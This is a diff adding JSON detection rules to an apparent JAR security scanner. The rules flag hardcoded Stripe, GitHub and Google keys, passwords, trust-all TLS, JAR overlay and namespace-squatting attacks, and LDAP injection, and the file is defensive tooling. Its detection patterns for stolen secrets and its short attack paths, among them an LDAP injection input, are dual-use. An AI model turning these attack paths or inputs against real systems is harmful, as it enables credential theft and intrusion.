+        "pattern": "BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY|BEGIN CERTIFICATE"
+      }
+    },
+
+    {
+      "id": "jar-secrets-stripe-key",
+      "title": "Hardcoded Stripe API Key",
+      "severity": "Critical",
+      "category": "Sensitive Data",
+      "enabled": true,
+      "description": "A Stripe live secret key (sk_live_...) is hardcoded in the JAR. This enables unauthorized financial transactions, customer data access, and account takeover.",
+      "attack_path": "Attacker extracts key from JAR, uses Stripe API to create charges, read customer data, issue refunds, or transfer funds.",
+      "remediation": "Rotate the leaked key immediately in Stripe dashboard. Store secrets in environment variables or a secrets manager, never in code.",
+      "cwe": ["CWE-798"],
+      "references": [],
+      "tags": ["stripe", "payment", "api-key", "hardcoded-secret"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "sk_live_[0-9a-zA-Z]{24,}"
+      }
+    },
+
+    {
+      "id": "jar-secrets-github-token",
+      "title": "Hardcoded GitHub Token",
+      "severity": "Critical",
+      "category": "Sensitive Data",
+      "enabled": true,
+      "description": "A GitHub personal access token (ghp_, gho_, ghu_, ghs_, or github_pat_) is hardcoded in the JAR. Leaked tokens allow read/write access to repositories and organization data.",
+      "attack_path": "Attacker uses token to read private repos, modify code, steal source, or access secrets stored in GitHub Actions.",
+      "remediation": "Rotate the token immediately. Use GitHub Actions secrets or a vault. Never store tokens in code.",
+      "cwe": ["CWE-798"],
+      "references": [],
+      "tags": ["github", "token", "api-key", "hardcoded-secret"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "ghp_[0-9a-zA-Z]{36}|gho_[0-9a-zA-Z]{36}|github_pat_[0-9a-zA-Z_]{82}"
+      }
+    },
+
+    {
+      "id": "jar-secrets-google-api-key",
+      "title": "Hardcoded Google API Key",
+      "severity": "High",
+      "category": "Sensitive Data",
+      "enabled": true,
+      "description": "A Google API key (AIza...) is hardcoded in the JAR, potentially allowing unauthorized use of Google APIs (Maps, Vision, Translate, Firebase, etc.) at the owner's expense.",
+      "attack_path": "Attacker uses extracted key to make API calls, incurring billing charges, accessing data, or reaching quota limits that degrade the application.",
+      "remediation": "Restrict API keys to specific APIs, referrers, and IPs in Google Cloud Console. Store keys in environment variables, not code.",
+      "cwe": ["CWE-798"],
+      "references": [],
+      "tags": ["google", "api-key", "hardcoded-secret"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "AIza[0-9A-Za-z_-]{35}"
+      }
+    },
+
+    {
+      "id": "jar-secrets-password-literal",
+      "title": "Hardcoded Password in Source",
+      "severity": "High",
+      "category": "Sensitive Data",
+      "enabled": true,
+      "description": "A password, secret, or credential is hardcoded as a string literal in the class files. Decompiling the JAR reveals the plaintext credential.",
+      "attack_path": "Attacker decompiles JAR with jadx/cfr, finds the password/secret string, uses it to authenticate to databases, APIs, or admin interfaces.",
+      "remediation": "Externalize credentials to environment variables, .properties files excluded from VCS, or a secrets manager.",
+      "cwe": ["CWE-259"],
+      "references": ["https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password"],
+      "tags": ["password", "hardcoded-credentials", "secret"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "password\\s*=\\s*[\"'][^\"']{4,}[\"']|passwd\\s*=\\s*[\"'][^\"']{4,}[\"']|secret\\s*=\\s*[\"'][^\"']{8,}[\"']"
+      }
+    },
+
+    {
+      "id": "jar-secrets-keystores-bundled",
+      "title": "Keystore or Certificate File Bundled in JAR",
+      "severity": "High",
+      "category": "Sensitive Data",
+      "enabled": true,
+      "description": "A JKS, PKCS12, or PEM certificate/keystore file is bundled inside the JAR. If the keystore password is weak or also bundled, this exposes private keys.",
+      "attack_path": "Attacker extracts .jks/.p12 file with jar -xf or unzip, then brute-forces the keystore password, recovering private keys used for TLS or code signing.",
+      "remediation": "Do not bundle keystores in distributable JARs. Use OS-level or cloud key management. If needed, ensure strong passwords stored separately.",
+      "cwe": ["CWE-321"],
+      "references": [],
+      "tags": ["keystore", "jks", "p12", "certificate"],
+      "detection": {
+        "type": "entry_pattern",
+        "pattern": "\\.jks$|\\.p12$|\\.pfx$|\\.pem$|\\.cer$|\\.crt$"
+      }
+    },
+
+    {
+      "id": "jar-network-trustall-certs",
+      "title": "TLS Trust-All Certificates (Disabled Validation)",
+      "severity": "Critical",
+      "category": "Network Security",
+      "enabled": true,
+      "description": "The code implements an X509TrustManager that accepts all certificates (empty checkServerTrusted). This completely disables TLS certificate validation, enabling man-in-the-middle attacks.",
+      "attack_path": "Attacker performs MitM with any certificate. All TLS-protected data (credentials, tokens, PII) is visible and modifiable.",
+      "remediation": "Never override X509TrustManager. Use the default trust manager. For testing, use a local CA with HttpsURLConnection.setSSLSocketFactory().",
+      "cwe": ["CWE-295"],
+      "references": ["https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning"],
+      "tags": ["tls", "trust-all", "mitm", "ssl-bypass"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "checkServerTrusted|TrustAllCerts|ALLOW_ALL_HOSTNAME_VERIFIER|NullHostnameVerifier|NoopHostnameVerifier"
+      }
+    },
+
+    {
+      "id": "jar-network-weak-tls-version",
+      "title": "Weak TLS Protocol: SSLv3 / TLSv1.0 / TLSv1.1",
+      "severity": "High",
+      "category": "Network Security",
+      "enabled": true,
+      "description": "The code explicitly enables deprecated TLS/SSL protocol versions. SSLv3 is vulnerable to POODLE; TLS 1.0/1.1 are deprecated by RFC 8996 and susceptible to BEAST and others.",
+      "attack_path": "Protocol downgrade attacks force the connection to a weak cipher suite. Known attacks (POODLE, BEAST) can decrypt sensitive data.",
+      "remediation": "Enforce TLS 1.2 minimum. Prefer TLS 1.3. Remove references to SSLv3, TLSv1, TLSv1.1 from SSLContext.getInstance() calls.",
+      "cwe": ["CWE-326"],
+      "references": ["https://nvd.nist.gov/vuln/detail/CVE-2014-3566"],
+      "tags": ["tls", "sslv3", "tlsv1", "protocol-downgrade"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "SSLContext\\.getInstance\\s*\\(\\s*[\"'](SSL|SSLv2|SSLv3|TLSv1|TLSv1\\.1)[\"']"
+      }
+    },
+
+    {
+      "id": "jar-network-cleartext-http",
+      "title": "Cleartext HTTP URL in Code",
+      "severity": "Medium",
+      "category": "Network Security",
+      "enabled": true,
+      "description": "HTTP (not HTTPS) URLs are hardcoded in the JAR. Data sent over HTTP is visible and modifiable by network observers.",
+      "attack_path": "Attacker on same network captures HTTP traffic via ARP spoofing, intercepts credentials or session tokens, or injects malicious responses.",
+      "remediation": "Replace all http:// URLs with https://. Enforce HSTS. Reject non-TLS connections in server-side configuration.",
+      "cwe": ["CWE-319"],
+      "references": [],
+      "tags": ["http", "cleartext", "no-tls"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "http://(?!localhost|127\\.0\\.0\\.1|0\\.0\\.0\\.0)[a-zA-Z0-9]"
+      }
+    },
+
+    {
+      "id": "jar-network-hostname-verifier-disabled",
+      "title": "Hostname Verification Disabled",
+      "severity": "Critical",
+      "category": "Network Security",
+      "enabled": true,
+      "description": "A custom HostnameVerifier that always returns true is used, disabling hostname verification. Combined with any trusted certificate, this allows MitM with a certificate for a different hostname.",
+      "attack_path": "Attacker presents a valid certificate for attacker.com while impersonating api.bank.com. The disabled verifier accepts it, exposing all traffic.",
+      "remediation": "Use the default HostnameVerifier. Never return true unconditionally from HostnameVerifier.verify().",
+      "cwe": ["CWE-297"],
+      "references": [],
+      "tags": ["hostname-verifier", "tls", "mitm"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "HttpsURLConnection\\.setDefaultHostnameVerifier|hostnameVerifier.*return true|verify.*return true"
+      }
+    },
+
+    {
+      "id": "jar-jar-duplicate-entries",
+      "title": "Duplicate ZIP Entries (JAR Overlay Attack)",
+      "severity": "High",
+      "category": "JAR-specific Attack",
+      "enabled": true,
+      "description": "The JAR contains duplicate ZIP entries (same filename appearing more than once). Different JVM implementations parse ZIP files differently — some use the first entry, others the last. This discrepancy enables class shadowing attacks.",
+      "attack_path": "A malicious JAR signed with a valid signature for the first entry can contain a second malicious class under the same name that gets loaded by a vulnerable parser, bypassing signature verification.",
+      "remediation": "Rebuild the JAR ensuring each entry name is unique. Use jarsigner -verify to check for anomalies. Reject JARs with duplicate entries in security-sensitive pipelines.",
+      "cwe": ["CWE-284"],
+      "references": ["https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/android"],
+      "tags": ["jar-overlay", "duplicate-entries", "signature-bypass"],
+      "detection": {
+        "type": "duplicate_entries"
+      }
+    },
+
+    {
+      "id": "jar-jar-namespace-squatting",
+      "title": "Java Core Namespace Squatting",
+      "severity": "Critical",
+      "category": "JAR-specific Attack",
+      "enabled": true,
+      "description": "The JAR contains .class files under the java/ or javax/ package namespace. Legitimate JARs must never ship classes in these reserved namespaces. This indicates a class shadowing or bootstrap attack attempt.",
+      "attack_path": "A JAR with java/lang/String.class loaded via certain class loaders can replace core JDK classes, enabling arbitrary code execution with JVM-level trust.",
+      "remediation": "Reject any third-party JAR containing classes in java.*, javax.*, or sun.* packages. This is almost always malicious.",
+      "cwe": ["CWE-470"],
+      "references": [],
+      "tags": ["namespace-squatting", "class-shadowing", "malicious-jar"],
+      "detection": {
+        "type": "entry_pattern",
+        "pattern": "^java/|^javax/|^sun/|^com/sun/|^jdk/"
+      }
+    },
+
+    {
+      "id": "jar-jar-dangerous-spi",
+      "title": "Dangerous Security Provider via SPI",
+      "severity": "High",
+      "category": "JAR-specific Attack",
+      "enabled": true,
+      "description": "The JAR registers a custom Java Security Provider via META-INF/services/java.security.Provider. Custom security providers can intercept or replace cryptographic operations.",
+      "attack_path": "A malicious security provider can intercept SecureRandom calls to produce predictable values, weaken key generation, or log generated keys to exfiltrate them.",
+      "remediation": "Audit any JAR registering a custom security provider. Ensure it comes from a trusted, audited source. Verify the provider implements algorithms correctly.",
+      "cwe": ["CWE-284"],
+      "references": ["https://docs.oracle.com/javase/8/docs/technotes/guides/security/crypto/HowToImplAProvider.html"],
+      "tags": ["spi", "security-provider", "crypto-intercept"],
+      "detection": {
+        "type": "services_entry",
+        "interface": "java.security.Provider"
+      }
+    },
+
+    {
+      "id": "jar-jar-external-classpath",
+      "title": "JAR Contains External Classpath Dependencies",
+      "severity": "Low",
+      "category": "JAR-specific Attack",
+      "enabled": true,
+      "description": "The JAR's MANIFEST.MF Class-Path attribute references other JAR files. If those JARs are absent or replaced by an attacker, the application may load malicious code.",
+      "attack_path": "Attacker places a malicious JAR at the Class-Path location before the legitimate JAR is present. JVM loads attacker's code when the main JAR is executed.",
+      "remediation": "Verify the integrity of all Class-Path JARs at deployment. Prefer fat-JARs or dependency management systems (Maven, Gradle) over manual Class-Path.",
+      "cwe": ["CWE-426"],
+      "references": [],
+      "tags": ["classpath-hijacking", "manifest"],
+      "detection": {
+        "type": "manifest_attr",
+        "attribute": "Class-Path",
+        "check": "not_empty"
+      }
+    },
+
+    {
+      "id": "jar-log-sensitive-data",
+      "title": "Potential Sensitive Data Logging",
+      "severity": "Low",
+      "category": "Logging",
+      "enabled": true,
+      "description": "Logging calls pass strings that may include sensitive fields like 'password', 'token', or 'secret'. This can leak credentials into log files, monitoring systems, or SIEM tools.",
+      "attack_path": "Attacker gains read access to log files (common in misconfigured cloud storage, Splunk, ELK) and extracts plaintext credentials or tokens.",
+      "remediation": "Audit logging statements. Mask or redact sensitive fields before logging. Use structured logging with field-level redaction.",
+      "cwe": ["CWE-532"],
+      "references": [],
+      "tags": ["logging", "sensitive-data", "password"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "log\\.(info|debug|warn|error|trace).*password|log\\.(info|debug|warn|error|trace).*token|log\\.(info|debug|warn|error|trace).*secret"
+      }
+    },
+
+    {
+      "id": "jar-input-ldap-injection",
+      "title": "LDAP Injection Risk",
+      "severity": "High",
+      "category": "Input Validation",
+      "enabled": true,
+      "description": "LDAP search filters are constructed with string concatenation. If user input is included, an attacker can manipulate the filter to bypass authentication or extract unauthorized directory entries.",
+      "attack_path": "Attacker injects * or )(&(uid=*) into a username field used in an LDAP search, bypassing authentication or enumerating all users.",
+      "remediation": "Use LDAP encoding (e.g., LdapEncoder.filterEncode from Spring LDAP) to escape all user input included in LDAP filters.",
+      "cwe": ["CWE-90"],
+      "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+      "tags": ["ldap-injection", "ldap", "authentication-bypass"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "DirContext|NamingEnumeration|searchFilter|ldap\\.(search|lookup)|search\\s*\\(.*filter"
+      }
+    }
+
+  ]
+}
